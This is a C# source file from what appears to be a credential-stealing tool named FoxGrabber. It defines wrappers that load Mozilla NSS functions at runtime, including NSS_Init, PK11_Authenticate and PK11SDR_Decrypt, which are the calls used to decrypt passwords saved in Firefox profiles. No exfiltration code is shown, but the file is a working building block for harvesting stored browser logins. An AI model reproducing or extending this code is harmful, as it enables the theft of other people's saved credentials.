namespace FoxGrabber
{
    using System;
    using System.Runtime.InteropServices;
    using static FoxGrabber.Delegates;
    using static FoxGrabber.Structures;

    public class NSS
    {
        public static IntPtr _nssModule { get; set; }

        public NSS() { }

        public static long NSS_Init(string path) => 
            ((NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "NSS_Init"), typeof(NSS_InitPtr)))(path);

        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, string inStr, int inLen) => 
            ((NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "NSSBase64_DecodeBuffer"), typeof(NSSBase64_DecodeBufferPtr)))(arenaOpt, outItemOpt, inStr, inLen);

        public static long PK11_GetInternalKeySlot() => 
            ((PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "PK11_GetInternalKeySlot"), typeof(PK11_GetInternalKeySlotPtr)))();

        public static long PK11_Authenticate(long slot, bool loadCerts, long wincx) => 
            ((PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "PK11_Authenticate"), typeof(PK11_AuthenticatePtr)))(slot, loadCerts, wincx);

        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx) => 
            ((PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "PK11SDR_Decrypt"), typeof(PK11SDR_DecryptPtr)))(ref data, ref result, cx);

        public static int NSS_Shutdown() => 
            ((NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "NSS_Shutdown"), typeof(NSS_ShutdownPtr)))();

        public static int PK11_FreeSlot(long slot) => 
            ((PK11_FreeSlotPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, "PK11_FreeSlot"), typeof(PK11_FreeSlotPtr)))(slot);
    }
}